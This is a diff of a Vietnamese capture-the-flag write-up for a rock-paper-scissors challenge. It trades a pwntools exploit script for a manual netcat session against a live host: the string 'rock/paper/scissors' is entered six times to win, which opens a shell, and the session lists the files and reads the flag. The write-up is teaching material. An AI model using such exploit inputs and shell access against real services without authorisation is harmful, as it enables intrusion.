@@ -150,32 +150,74 @@ Tận dụng lỗi này ta sẽ nhập `{"rock", "paper", "scissors"}` 6 lần �
 	
       }
 ```
-Payload khai thác.
+Chúng ta sẽ connect đến `netcat` để thực hiện 6 lần nhập sau đó khi chương trình gọi `/bin/sh` ta sẽ lấy được `shell`.
 ```
-halston in ~/CTF/miniCTF2022/warmup/RPS λ cat exploit.py
-from pwn import *
+halston in ~ λ nc 174.138.21.217 3138
+Welcome challenger to the game of Rock, Paper, Scissors
+For anyone that beats me 5 times in a row, I will offer up a flag I found
+Are you ready?
+Type '1' to play a game
+Type '2' to exit the program
+1
 
-p = remote("174.138.21.217", 3138)
 
-for i in range(6):
-        p.recvuntil(b"Type '2' to exit the program")
-        p.sendline(b"1")
-        p.recvuntil(b"Please make your selection (rock/paper/scissors):")
-        p.sendline(b"rock/paper/scissors")
-
-p.interactive()
-```
-Run payload bằng python
-```
-halston in ~/CTF/miniCTF2022/warmup/RPS λ python3 exploit.py
-[+] Opening connection to 174.138.21.217 on port 3138: Done
-[*] Switching to interactive mode
-
-You played: rock/paper/scissors
+Please make your selection (rock/paper/scissors):
+(rock/paper/scissors)
+You played: (rock/paper/scissors)
 The computer played: rock
 You win! Play again?
+Type '1' to play a game
+Type '2' to exit the program
+1
+
+
+Please make your selection (rock/paper/scissors):
+(rock/paper/scissors)
+You played: (rock/paper/scissors)
+The computer played: rock
+You win! Play again?
+Type '1' to play a game
+Type '2' to exit the program
+1
+
+
+Please make your selection (rock/paper/scissors):
+(rock/paper/scissors)
+You played: (rock/paper/scissors)
+The computer played: rock
+You win! Play again?
+Type '1' to play a game
+Type '2' to exit the program
+1
+
+
+Please make your selection (rock/paper/scissors):
+(rock/paper/scissors)
+You played: (rock/paper/scissors)
+The computer played: scissors
+You win! Play again?
+Type '1' to play a game
+Type '2' to exit the program
+1
+
+
+Please make your selection (rock/paper/scissors):
+(rock/paper/scissors)
+You played: (rock/paper/scissors)
+The computer played: paper
+You win! Play again?
+Type '1' to play a game
+Type '2' to exit the program
+1
+
+
+Please make your selection (rock/paper/scissors):
+(rock/paper/scissors)
+You played: (rock/paper/scissors)
+The computer played: scissors
+You win! Play again?
 Congrats!!!
-$ ls
+ls
 bin
 chall
 dev
@@ -185,9 +227,12 @@ lib
 lib32
 lib64
 libc.so.6
-$ cat flag.txt
+cat flag.xtt
+cat: flag.xtt: No such file or directory
+cat flag.txt
 ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}
 ```
+
 
 ## Flag
 `ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}`
